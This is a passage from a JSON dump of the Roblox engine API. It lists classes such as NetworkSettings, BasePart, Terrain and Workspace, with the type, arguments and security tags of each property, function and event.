ool","type":"Property","Name":"PrintSplitMessage","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintStreamInstanceQuota","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintTouches","tags":[],"Class":"NetworkSettings"},{"ValueType":"double","type":"Property","Name":"ReceiveRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"RenderStreamedRegions","tags":[],"Class":"NetworkSettings"},{"ValueType":"string","type":"Property","Name":"ReportStatURL","tags":["deprecated","hidden"],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"SendPacketBufferLimit","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"ShowActiveAnimationAsset","tags":[],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"TouchSendRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"TrackDataTypes","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"TrackPhysicsDetails","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"UseInstancePacketCache","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"UsePhysicsPacketCache","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"WaitingForCharacterLogRate","tags":["deprecated","hidden"],"Class":"NetworkSettings"},{"Superclass":"Instance","type":"Class","Name":"NotificationService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"CancelAllNotification","tags":["LocalUserSecurity"],"Class":"NotificationService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"alertId","Default":null}],"Name":"CancelNotification","tags":["LocalUserSecurity"],"Class":"NotificationService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"alertId","Default":null},{"Type":"string","Name":"alertMsg","Default":null},{"Type":"int","Name":"minutesToFire","Default":null}],"Name":"ScheduleNotification","tags":["LocalUserSecurity"],"Class":"NotificationService","type":"Function"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetScheduledNotifications","tags":["LocalUserSecurity"],"Class":"NotificationService","type":"YieldFunction"},{"Arguments":[{"Name":"connectionName","Type":"string"},{"Name":"connectionState","Type":"ConnectionState"},{"Name":"sequenceNumber","Type":"string"}],"Name":"RobloxConnectionChanged","tags":["RobloxScriptSecurity"],"Class":"NotificationService","type":"Event"},{"Arguments":[{"Name":"eventData","Type":"Map"}],"Name":"RobloxEventReceived","tags":["RobloxScriptSecurity"],"Class":"NotificationService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"NumberValue","tags":[]},{"ValueType":"double","type":"Property","Name":"Value","tags":[],"Class":"NumberValue"},{"Arguments":[{"Name":"value","Type":"double"}],"Name":"Changed","tags":[],"Class":"NumberValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"double"}],"Name":"changed","tags":["deprecated"],"Class":"NumberValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ObjectValue","tags":[]},{"ValueType":"Object","type":"Property","Name":"Value","tags":[],"Class":"ObjectValue"},{"Arguments":[{"Name":"value","Type":"Instance"}],"Name":"Changed","tags":[],"Class":"ObjectValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"Instance"}],"Name":"changed","tags":["deprecated"],"Class":"ObjectValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"OneQuarterClusterPacketCacheBase","tags":[]},{"Superclass":"Instance","type":"Class","Name":"PVInstance","tags":["notbrowsable"]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CoordinateFrame","tags":["deprecated","writeonly"],"Class":"PVInstance"},{"Superclass":"PVInstance","type":"Class","Name":"BasePart","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"Anchored","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"BackParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"BackParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"BackSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"BackSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"BottomParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"BottomParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"BottomSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"BottomSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"BrickColor","type":"Property","Name":"BrickColor","tags":[],"Class":"BasePart"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"BasePart"},{"ValueType":"bool","type":"Property","Name":"CanCollide","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"CenterOfMass","tags":["readonly"],"Class":"BasePart"},{"ValueType":"int","type":"Property","Name":"CollisionGroupId","tags":[],"Class":"BasePart"},{"ValueType":"Color3","type":"Property","Name":"Color","tags":[],"Class":"BasePart"},{"ValueType":"PhysicalProperties","type":"Property","Name":"CustomPhysicalProperties","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"Elasticity","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"Friction","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"FrontParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"FrontParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"FrontSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"FrontSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"LeftParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"LeftParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"LeftSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"LeftSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"LocalTransparencyModifier","tags":["hidden"],"Class":"BasePart"},{"ValueType":"bool","type":"Property","Name":"Locked","tags":[],"Class":"BasePart"},{"ValueType":"Material","type":"Property","Name":"Material","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"Orientation","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"ReceiveAge","tags":["hidden","readonly"],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"Reflectance","tags":[],"Class":"BasePart"},{"ValueType":"int","type":"Property","Name":"ResizeIncrement","tags":["readonly"],"Class":"BasePart"},{"ValueType":"Faces","type":"Property","Name":"ResizeableFaces","tags":["readonly"],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"RightParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"RightParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"RightSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"RightSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"RotVelocity","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"Rotation","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"Size","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"SpecificGravity","tags":["deprecated","readonly"],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"TopParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"TopParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"TopSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"TopSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"Transparency","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"Velocity","tags":[],"Class":"BasePart"},{"ValueType":"BrickColor","type":"Property","Name":"brickColor","tags":["deprecated"],"Class":"BasePart"},{"ReturnType":"void","Arguments":[],"Name":"BreakJoints","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"part","Default":null}],"Name":"CanCollideWith","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Tuple","Arguments":[],"Name":"CanSetNetworkOwnership","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"bool","Name":"recursive","Default":"false"}],"Name":"GetConnectedParts","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetJoints","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetMass","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetNetworkOwner","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetNetworkOwnershipAuto","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[],"Name":"GetRenderCFrame","tags":["deprecated"],"Class":"BasePart","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetRootPart","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetTouchingParts","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsGrounded","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"MakeJoints","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"NormalId","Name":"normalId","Default":null},{"Type":"int","Name":"deltaAmount","Default":null}],"Name":"Resize","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"playerInstance","Default":"nil"}],"Name":"SetNetworkOwner","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SetNetworkOwnershipAuto","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"breakJoints","tags":["deprecated"],"Class":"BasePart","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"getMass","tags":["deprecated"],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"makeJoints","tags":["deprecated"],"Class":"BasePart","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"NormalId","Name":"normalId","Default":null},{"Type":"int","Name":"deltaAmount","Default":null}],"Name":"resize","tags":["deprecated"],"Class":"BasePart","type":"Function"},{"Arguments":[{"Name":"part","Type":"Instance"}],"Name":"LocalSimulationTouched","tags":["deprecated"],"Class":"BasePart","type":"Event"},{"Arguments":[],"Name":"OutfitChanged","tags":["deprecated"],"Class":"BasePart","type":"Event"},{"Arguments":[{"Name":"otherPart","Type":"Instance"}],"Name":"StoppedTouching","tags":["deprecated"],"Class":"BasePart","type":"Event"},{"Arguments":[{"Name":"otherPart","Type":"Instance"}],"Name":"TouchEnded","tags":[],"Class":"BasePart","type":"Event"},{"Arguments":[{"Name":"otherPart","Type":"Instance"}],"Name":"Touched","tags":[],"Class":"BasePart","type":"Event"},{"Arguments":[{"Name":"otherPart","Type":"Instance"}],"Name":"touched","tags":["deprecated"],"Class":"BasePart","type":"Event"},{"Superclass":"BasePart","type":"Class","Name":"CornerWedgePart","tags":[]},{"Superclass":"BasePart","type":"Class","Name":"FormFactorPart","tags":[]},{"ValueType":"FormFactor","type":"Property","Name":"FormFactor","tags":["deprecated"],"Class":"FormFactorPart"},{"ValueType":"FormFactor","type":"Property","Name":"formFactor","tags":["deprecated","hidden"],"Class":"FormFactorPart"},{"Superclass":"FormFactorPart","type":"Class","Name":"Part","tags":[]},{"ValueType":"PartType","type":"Property","Name":"Shape","tags":[],"Class":"Part"},{"Superclass":"Part","type":"Class","Name":"FlagStand","tags":["deprecated"]},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"FlagStand"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"FlagCaptured","tags":[],"Class":"FlagStand","type":"Event"},{"Superclass":"Part","type":"Class","Name":"Platform","tags":[]},{"Superclass":"Part","type":"Class","Name":"Seat","tags":[]},{"ValueType":"bool","type":"Property","Name":"Disabled","tags":[],"Class":"Seat"},{"ValueType":"Object","type":"Property","Name":"Occupant","tags":["readonly"],"Class":"Seat"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"humanoid","Default":null}],"Name":"Sit","tags":[],"Class":"Seat","type":"Function"},{"Superclass":"Part","type":"Class","Name":"SkateboardPlatform","tags":["deprecated"]},{"ValueType":"Object","type":"Property","Name":"Controller","tags":["readonly"],"Class":"SkateboardPlatform"},{"ValueType":"Object","type":"Property","Name":"ControllingHumanoid","tags":["readonly"],"Class":"SkateboardPlatform"},{"ValueType":"int","type":"Property","Name":"Steer","tags":[],"Class":"SkateboardPlatform"},{"ValueType":"bool","type":"Property","Name":"StickyWheels","tags":[],"Class":"SkateboardPlatform"},{"ValueType":"int","type":"Property","Name":"Throttle","tags":[],"Class":"SkateboardPlatform"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"impulseWorld","Default":null}],"Name":"ApplySpecificImpulse","tags":[],"Class":"SkateboardPlatform","type":"Function"},{"Arguments":[{"Name":"humanoid","Type":"Instance"},{"Name":"skateboardController","Type":"Instance"}],"Name":"Equipped","tags":[],"Class":"SkateboardPlatform","type":"Event"},{"Arguments":[{"Name":"newState","Type":"MoveState"},{"Name":"oldState","Type":"MoveState"}],"Name":"MoveStateChanged","tags":[],"Class":"SkateboardPlatform","type":"Event"},{"Arguments":[{"Name":"humanoid","Type":"Instance"}],"Name":"Unequipped","tags":[],"Class":"SkateboardPlatform","type":"Event"},{"Arguments":[{"Name":"humanoid","Type":"Instance"},{"Name":"skateboardController","Type":"Instance"}],"Name":"equipped","tags":["deprecated"],"Class":"SkateboardPlatform","type":"Event"},{"Arguments":[{"Name":"humanoid","Type":"Instance"}],"Name":"unequipped","tags":["deprecated"],"Class":"SkateboardPlatform","type":"Event"},{"Superclass":"Part","type":"Class","Name":"SpawnLocation","tags":[]},{"ValueType":"bool","type":"Property","Name":"AllowTeamChangeOnTouch","tags":[],"Class":"SpawnLocation"},{"ValueType":"int","type":"Property","Name":"Duration","tags":[],"Class":"SpawnLocation"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"SpawnLocation"},{"ValueType":"bool","type":"Property","Name":"Neutral","tags":[],"Class":"SpawnLocation"},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"SpawnLocation"},{"Superclass":"FormFactorPart","type":"Class","Name":"WedgePart","tags":[]},{"Superclass":"BasePart","type":"Class","Name":"MeshPart","tags":[]},{"ValueType":"Content","type":"Property","Name":"MeshId","tags":["ScriptWriteRestricted: [NotAccessibleSecurity]"],"Class":"MeshPart"},{"ValueType":"Content","type":"Property","Name":"TextureID","tags":[],"Class":"MeshPart"},{"Superclass":"BasePart","type":"Class","Name":"ParallelRampPart","tags":["deprecated","notbrowsable"]},{"Superclass":"BasePart","type":"Class","Name":"PartOperation","tags":[]},{"ValueType":"int","type":"Property","Name":"TriangleCount","tags":["readonly"],"Class":"PartOperation"},{"ValueType":"bool","type":"Property","Name":"UsePartColor","tags":[],"Class":"PartOperation"},{"Superclass":"PartOperation","type":"Class","Name":"NegateOperation","tags":[]},{"Superclass":"PartOperation","type":"Class","Name":"UnionOperation","tags":[]},{"Superclass":"BasePart","type":"Class","Name":"PrismPart","tags":["deprecated","notbrowsable"]},{"ValueType":"PrismSides","type":"Property","Name":"Sides","tags":[],"Class":"PrismPart"},{"Superclass":"BasePart","type":"Class","Name":"PyramidPart","tags":["deprecated","notbrowsable"]},{"ValueType":"PyramidSides","type":"Property","Name":"Sides","tags":[],"Class":"PyramidPart"},{"Superclass":"BasePart","type":"Class","Name":"RightAngleRampPart","tags":["deprecated","notbrowsable"]},{"Superclass":"BasePart","type":"Class","Name":"Terrain","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"IsSmooth","tags":["deprecated","readonly"],"Class":"Terrain"},{"ValueType":"Region3int16","type":"Property","Name":"MaxExtents","tags":["readonly"],"Class":"Terrain"},{"ValueType":"Color3","type":"Property","Name":"WaterColor","tags":[],"Class":"Terrain"},{"ValueType":"float","type":"Property","Name":"WaterReflectance","tags":[],"Class":"Terrain"},{"ValueType":"float","type":"Property","Name":"WaterTransparency","tags":[],"Class":"Terrain"},{"ValueType":"float","type":"Property","Name":"WaterWaveSize","tags":[],"Class":"Terrain"},{"ValueType":"float","type":"Property","Name":"WaterWaveSpeed","tags":[],"Class":"Terrain"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"AutowedgeCell","tags":["deprecated"],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Region3int16","Name":"region","Default":null}],"Name":"AutowedgeCells","tags":["deprecated"],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"CellCenterToWorld","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"CellCornerToWorld","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Clear","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ConvertToSmooth","tags":["PluginSecurity","deprecated"],"Class":"Terrain","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Region3int16","Name":"region","Default":null}],"Name":"CopyRegion","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"CountCells","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"center","Default":null},{"Type":"float","Name":"radius","Default":null},{"Type":"Material","Name":"material","Default":null}],"Name":"FillBall","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoordinateFrame","Name":"cframe","Default":null},{"Type":"Vector3","Name":"size","Default":null},{"Type":"Material","Name":"material","Default":null}],"Name":"FillBlock","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"float","Name":"resolution","Default":null},{"Type":"Material","Name":"material","Default":null}],"Name":"FillRegion","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"GetCell","tags":["deprecated"],"Class":"Terrain","type":"Function"},{"ReturnType":"Color3","Arguments":[{"Type":"Material","Name":"material","Default":null}],"Name":"GetMaterialColor","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"GetWaterCell","tags":["deprecated"],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"region","Default":null},{"Type":"Vector3int16","Name":"corner","Default":null},{"Type":"bool","Name":"pasteEmptyCells","Default":null}],"Name":"PasteRegion","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"float","Name":"resolution","Default":null}],"Name":"ReadVoxels","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null},{"Type":"CellMaterial","Name":"material","Default":null},{"Type":"CellBlock","Name":"block","Default":null},{"Type":"CellOrientation","Name":"orientation","Default":null}],"Name":"SetCell","tags":["deprecated"],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Region3int16","Name":"region","Default":null},{"Type":"CellMaterial","Name":"material","Default":null},{"Type":"CellBlock","Name":"block","Default":null},{"Type":"CellOrientation","Name":"orientation","Default":null}],"Name":"SetCells","tags":["deprecated"],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Material","Name":"material","Default":null},{"Type":"Color3","Name":"value","Default":null}],"Name":"SetMaterialColor","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null},{"Type":"WaterForce","Name":"force","Default":null},{"Type":"WaterDirection","Name":"direction","Default":null}],"Name":"SetWaterCell","tags":["deprecated"],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"WorldToCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"WorldToCellPreferEmpty","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"WorldToCellPreferSolid","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"float","Name":"resolution","Default":null},{"Type":"Array","Name":"materials","Default":null},{"Type":"Array","Name":"occupancy","Default":null}],"Name":"WriteVoxels","tags":[],"Class":"Terrain","type":"Function"},{"Superclass":"BasePart","type":"Class","Name":"TrussPart","tags":[]},{"ValueType":"Style","type":"Property","Name":"Style","tags":[],"Class":"TrussPart"},{"Superclass":"BasePart","type":"Class","Name":"VehicleSeat","tags":[]},{"ValueType":"int","type":"Property","Name":"AreHingesDetected","tags":["readonly"],"Class":"VehicleSeat"},{"ValueType":"bool","type":"Property","Name":"Disabled","tags":[],"Class":"VehicleSeat"},{"ValueType":"bool","type":"Property","Name":"HeadsUpDisplay","tags":[],"Class":"VehicleSeat"},{"ValueType":"float","type":"Property","Name":"MaxSpeed","tags":[],"Class":"VehicleSeat"},{"ValueType":"Object","type":"Property","Name":"Occupant","tags":["readonly"],"Class":"VehicleSeat"},{"ValueType":"int","type":"Property","Name":"Steer","tags":[],"Class":"VehicleSeat"},{"ValueType":"float","type":"Property","Name":"SteerFloat","tags":[],"Class":"VehicleSeat"},{"ValueType":"int","type":"Property","Name":"Throttle","tags":[],"Class":"VehicleSeat"},{"ValueType":"float","type":"Property","Name":"ThrottleFloat","tags":[],"Class":"VehicleSeat"},{"ValueType":"float","type":"Property","Name":"Torque","tags":[],"Class":"VehicleSeat"},{"ValueType":"float","type":"Property","Name":"TurnSpeed","tags":[],"Class":"VehicleSeat"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"humanoid","Default":null}],"Name":"Sit","tags":[],"Class":"VehicleSeat","type":"Function"},{"Superclass":"PVInstance","type":"Class","Name":"Model","tags":[]},{"ValueType":"Object","type":"Property","Name":"PrimaryPart","tags":[],"Class":"Model"},{"ReturnType":"void","Arguments":[],"Name":"BreakJoints","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetExtentsSize","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[],"Name":"GetModelCFrame","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetModelSize","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[],"Name":"GetPrimaryPartCFrame","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"MakeJoints","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"MoveTo","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ResetOrientationToIdentity","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SetIdentityOrientation","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoordinateFrame","Name":"cframe","Default":null}],"Name":"SetPrimaryPartCFrame","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"delta","Default":null}],"Name":"TranslateBy","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"breakJoints","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"makeJoints","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"location","Default":null}],"Name":"move","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"location","Default":null}],"Name":"moveTo","tags":["deprecated"],"Class":"Model","type":"Function"},{"Superclass":"Model","type":"Class","Name":"RootInstance","tags":["notbrowsable"]},{"Superclass":"RootInstance","type":"Class","Name":"Workspace","tags":[]},{"ValueType":"bool","type":"Property","Name":"AllowThirdPartySales","tags":[],"Class":"Workspace"},{"ValueType":"Object","type":"Property","Name":"CurrentCamera","tags":[],"Class":"Workspace"},{"ValueType":"double","type":"Property","Name":"DistributedGameTime","tags":[],"Class":"Workspace"},{"ValueType":"float","type":"Property","Name":"FallenPartsDestroyHeight","tags":["ScriptWriteRestricted: [PluginSecurity]"],"Class":"Workspace"},{"ValueType":"bool","type":"Property","Name":"FilteringEnabled","tags":["ScriptWriteRestricted: [PluginSecurity]"],"Class":"Workspace"},{"ValueType":"float","type":"Property","Name":"Gravity","tags":[],"Class":"Workspace"},{"ValueType":"bool","type":"Property","Name":"StreamingEnabled","tags":[],"Class":"Workspace"},{"ValueType":"Object","type":"Property","Name":"Terrain","tags":["readonly"],"Class":"Workspace"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"BreakJoints","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"ExperimentalSolverIsEnabled","tags":["LocalUserSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Ray","Name":"ray","Default":null},{"Type":"Instance","Name":"ignoreDescendantsInstance","Default":"nil"},{"Type":"bool","Name":"terrainCellsAreCubes","Default":"false"},{"Type":"bool","Name":"ignoreWater","Default":"false"}],"Name":"FindPartOnRay","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Ray","Name":"ray","Default":null},{"Type":"Objects","Name":"ignoreDescendantsTable","Default":null},{"Type":"bool","Name":"terrainCellsAreCubes","Default":"false"},{"Type":"bool","Name":"ignoreWater","Default":"false"}],"Name":"FindPartOnRayWithIgnoreList","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Ray","Name":"ray","Default":null},{"Type":"Objects","Name":"whitelistDescendantsTable","Default":null},{"Type":"bool","Name":"ignoreWater","Default":"false"}],"Name":"FindPartOnRayWithWhitelist","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Instance","Name":"ignoreDescendantsInstance","Default":"nil"},{"Type":"int","Name":"maxParts","Default":"20"}],"Name":"FindPartsInRegion3","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Objects","Name":"ignoreDescendantsTable","Default":null},{"Type":"int","Name":"maxParts","Default":"20"}],"Name":"FindPartsInRegion3WithIgnoreList","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Objects","Name":"whitelistDescendantsTable","Default":null},{"Type":"int","Name":"maxParts","Default":"20"}],"Name":"FindPartsInRegion3WithWhiteList","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetNumAwakeParts","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetPhysicsAnalyzerBreakOnIssue","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"int","Name":"index","Default":null}],"Name":"GetPhysicsAnalyzerIssue","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetPhysicsThrottling","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRealPhysicsFPS","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"}],"Name":"IsRegion3Empty","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Objects","Name":"ignoreDescendentsTable","Default":null}],"Name":"IsRegion3EmptyWithIgnoreList","tags":[],"Class":"Workspace","type":"Function"},{"